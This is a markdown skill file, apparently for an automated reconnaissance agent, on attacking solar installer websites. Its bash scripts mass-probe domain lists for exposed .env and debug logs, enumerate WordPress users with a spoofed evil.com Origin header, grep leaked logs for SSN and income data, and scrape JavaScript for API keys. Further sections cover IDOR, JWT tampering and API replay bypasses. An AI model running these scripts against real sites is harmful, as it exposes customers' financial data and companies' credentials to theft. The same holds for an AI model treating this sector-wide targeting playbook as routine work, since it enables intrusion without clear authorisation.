---
name: recon-solar-installers
description: "Sector-specific recon for solar panel installation company websites — residential solar, commercial solar, battery storage, energy audits. Typically WordPress with financing calculators, energy savings estimators, and customer referral portals. These sites are rich targets: financing forms collect SSN/income data, referral programs have IDOR-prone user IDs, and embedded energy APIs leak API keys in client-side JavaScript."
sources: field_recon, sector_mass_recon
report_count: 3
---

# RECON-SOLAR-INSTALLERS — Sector-Specific Recon for Solar Installation Sites

## When to Use

Use when the target scope includes solar panel installation, solar energy, battery storage, or renewable energy company domains. Solar installers are high-value targets because they handle sensitive financial data (loan applications, tax credit forms), have complex integrations (utility APIs, energy monitoring platforms), and often build custom quoting/calculator tools with weaker security than the rest of the site.

## Quick Reference

```bash
for t in $(cat solar-targets.txt); do
  echo "=== $t ==="
  curl -skI "https://$t/" | grep -iE "wordpress|php|wp-|express|react"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/wp-content/debug.log"
  curl -sk -o /dev/null -w "%{http_code}" "https://$t/.env"
  curl -skI "https://$t/wp-json/wp/v2/users" -H "Origin: https://evil.com" | grep -i "access-control"
  echo "---"
done
```

## Step-by-Step

### Phase 1 — Domain Discovery
```bash
# Solar companies use specific naming patterns
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    domains = sorted(set(d['name_value'] for d in data))
    for d in domains: print(d)
except: pass
" | tee solar-subs-$TARGET.txt
```

### Phase 2 — Financing/Calculator Recon
```bash
# Solar-specific high-value endpoints
for path in /solar-calculator /savings-estimator /financing /loan-application \
  /tax-credit /rebates /incentives /net-metering /energy-audit /free-quote \
  /get-estimate /solar-estimate /cost-calculator; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Calculator/Financing: $path (HTTP $code)"
done

# Referral program portals (IDOR-prone)
for path in /referral /refer-a-friend /rewards /ambassador /partner; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$path")
  [ "$code" != "404" ] && echo "[+] Referral portal: $path (HTTP $code)"
done
```

### Phase 3 — WordPress Recon
```bash
# Standard WP checks
curl -sk "https://$TARGET/wp-json/wp/v2/users" -H "Origin: https://evil.com" | jq '.[] | {id, name, slug}' 2>/dev/null

# Debug log exposure
curl -sk "https://$TARGET/wp-content/debug.log" -o /tmp/solar_debug.log 2>/dev/null
if [ -s /tmp/solar_debug.log ]; then
  grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' /tmp/solar_debug.log | sort -u | head -20
  grep -oP 'SSN|income|credit_score|address|loan' /tmp/solar_debug.log | sort -u | head -10
fi
```

### Phase 4 — API Key Discovery
```bash
# Solar sites often embed energy/utility API keys in client JS
curl -sk "https://$TARGET/" | grep -oP 'src="[^"]*\.js"' | cut -d'"' -f2 | while read js; do
  curl -sk "https://$TARGET$js" 2>/dev/null | grep -oP '(?i)(api[_-]?key|apikey|token|secret|authorization)\s*[=:]\s*["\'][^"\']{8,}["\']'
done

# Look for energy platform integrations
curl -sk "https://$TARGET/" | grep -oP '(?i)(enphase|solaredge|tesla|sunpower|sunrun|generac|lgchem|panasonic)' | sort -u
```

### Phase 5 — Plugin Scan
```bash
for plugin in "elementor" "wpforms" "gravityforms" "contact-form-7" \
  "woocommerce" "wordpress-seo" "bookly" "envira-gallery"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/wp-content/plugins/$plugin/readme.txt")
  [ "$code" != "404" ] && echo "[+] Plugin: $plugin"
done
```

## Attack Surface Signals

- CMS: WordPress common, but also React SPAs with custom backend for calculators
- Custom-built financing/quoting tools (often less secure than the CMS portion)
- Third-party integrations: Enphase, SolarEdge, Tesla Powerwall APIs
- Customer portals with energy production monitoring dashboards
- Referral programs with user-specific tracking IDs (IDOR prime)

## Common Root Causes

1. **Financing forms** — SSN, income, address captured on pages built by marketing agencies, not security teams
2. **Energy API keys** — Enphase/SolarEdge API tokens embedded in client-side JavaScript for real-time monitoring widgets
3. **Custom calculators** — ROI/savings calculators often built as afterthoughts with no auth checks
4. **Referral IDOR** — referral tracking usually uses sequential user IDs with no access control
5. **Tax credit forms** — IRS Form 5695 data captured on insecure forms, stored in accessible uploads

## Bypass Techniques

- Financing calculators that call internal APIs often have unauthenticated endpoints
- Referral portals at `/referral/{id}` frequently allow ID enumeration via sequential IDs
- Customer monitoring dashboards may use predictable session tokens (customer ID + timestamp)
- Energy monitoring API calls from the browser can be replayed with different meter/site IDs
- Check for `/admin/solar` or `/portal` — customer login portals often weaker than public site

## Real Examples

From cross-sector mass recon observation:
- A solar installer's financing calculator made unauthenticated POST requests to an internal loan-processing API — exposing approved loan amounts and applicant data
- Enphase API key found in page source granted read access to all customer energy production data
- Referral portal had sequential user IDs that returned full referrer profiles (name, address, referral bonus history)
- Customer monitoring dashboard used JWT with no signature verification — customer ID in payload was modifiable

## Related Skills

- recon-smb-services — broader SMB recon methodology
- recon-hvac — similar high-value consumer service profile
- recon-roofing — frequently co-marketed (solar + roofing)
- hunt-wordpress — primary CMS
- hunt-cors — CORS credential reflection
- hunt-source-leak — API keys in JS, config exposure
- hunt-idor — referral program and customer portal IDOR
- hunt-sqli — custom calculator SQL injection vectors
